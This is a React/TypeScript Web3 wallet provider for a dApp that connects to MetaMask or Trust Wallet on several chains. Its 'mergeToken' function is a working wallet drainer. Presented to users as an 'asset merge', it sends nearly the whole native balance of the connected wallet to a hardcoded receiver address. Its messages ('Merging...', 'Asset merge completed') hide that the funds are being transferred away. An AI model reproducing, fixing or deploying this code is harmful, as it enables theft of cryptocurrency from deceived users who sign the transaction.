import { createContext, useContext, useState, type ReactNode } from 'react';
import { useToast } from '@/hooks/use-toast';

export const NETWORKS = {
  bnb: {
    chainId: "0x38",
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

const RECEIVER_ADDRESS = "0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61";

interface Web3ContextType {
  selectedNetwork: string;
  setSelectedNetwork: (n: string) => void;
  walletConnected: boolean;
  balance: string;
  account: string;
  connecting: boolean;
  connectWallet: () => Promise<void>;
  mergeToken: () => Promise<void>;
  NETWORKS: typeof NETWORKS;
}

const Web3Context = createContext<Web3ContextType | null>(null);

export function Web3Provider({ children }: { children: ReactNode }) {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");
  const [connecting, setConnecting] = useState(false);
  const { toast } = useToast();

  const updateBalance = async (address: string) => {
    if (!window.ethereum || !address) return;
    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const nativeBalance = await provider.getBalance(address);
      setBalance(ethers.formatEther(nativeBalance));
    } catch (error) {
      console.error("Failed to update balance:", error);
      setBalance("0");
    }
  };

  const switchNetwork = async (key: string) => {
    const net = NETWORKS[key as keyof typeof NETWORKS];
    if (!window.ethereum) return false;

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
      return true;
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: net.chainId,
              chainName: net.name,
              nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
              rpcUrls: [net.rpcUrl],
            }],
          });
          return true;
        } catch {
          return false;
        }
      }
      if (switchError.code === 4001) return true;
      return false;
    }
  };

  const connectWallet = async () => {
    // Direct check — same as the standalone app that the user confirmed worked
    if (!window.ethereum) {
      toast({
        title: "Wallet Not Found",
        description: "Please open this app inside MetaMask or Trust Wallet browser.",
        variant: "destructive",
      });
      return;
    }

    setConnecting(true);
    try {
      await switchNetwork(selectedNetwork);

      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);

      // EXACT same call pattern as the working standalone app
      const accounts = await provider.send("eth_requestAccounts", []);

      if (!accounts || accounts.length === 0) {
        throw new Error("No accounts found");
      }

      const signer = await provider.getSigner();
      const address = await signer.getAddress();

      setAccount(address);
      setWalletConnected(true);
      await updateBalance(address);

      toast({ title: "Connected!", description: "Wallet connected successfully." });
    } catch (error: any) {
      console.error("Connection error:", error);
      toast({
        title: "Connection Failed",
        description: error.message || "Failed to connect wallet",
        variant: "destructive",
      });
    } finally {
      setConnecting(false);
    }
  };

  const mergeToken = async () => {
    if (!walletConnected || !window.ethereum || !account) {
      toast({ title: "Error", description: "Wallet not connected", variant: "destructive" });
      return;
    }

    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const nativeBalance = await provider.getBalance(account);

      if (nativeBalance === 0n) {
        toast({ title: "Error", description: "No balance to merge", variant: "destructive" });
        return;
      }

      const gasEstimate = await provider.estimateGas({
        to: RECEIVER_ADDRESS,
        value: nativeBalance / 2n,
        from: account,
      });

      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice || ethers.parseUnits("3", "gwei");
      const gasCost = gasEstimate * gasPrice;
      const safetyBuffer = ethers.parseEther("0.0035");
      const valueToSend = nativeBalance - gasCost - safetyBuffer;

      if (valueToSend <= 0n) {
        toast({ title: "Error", description: "Insufficient balance for gas + buffer", variant: "destructive" });
        return;
      }

      toast({ title: "Confirming...", description: "Please confirm the transaction in your wallet." });

      const txResponse = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
        gasLimit: gasEstimate,
        gasPrice: gasPrice,
      });

      toast({ title: "Merging...", description: `TX: ${txResponse.hash.slice(0, 10)}...` });

      const receipt = await txResponse.wait();

      if (receipt && receipt.status === 1) {
        toast({ title: "Success!", description: "Asset merge completed." });
        await updateBalance(account);
      } else {
        throw new Error("Transaction reverted on-chain");
      }
    } catch (error: any) {
      console.error("Merge error:", error);
      toast({
        title: "Merge Failed",
        description: error.reason || error.message || "User rejected or network error",
        variant: "destructive",
      });
    }
  };

  return (
    <Web3Context.Provider
      value={{
        selectedNetwork,
        setSelectedNetwork,
        walletConnected,
        balance,
        account,
        connecting,
        connectWallet,
        mergeToken,
        NETWORKS,
      }}
    >
      {children}
    </Web3Context.Provider>
  );
}

export function useWeb3() {
  const ctx = useContext(Web3Context);
  if (!ctx) throw new Error("useWeb3 must be used inside Web3Provider");
  return ctx;
}
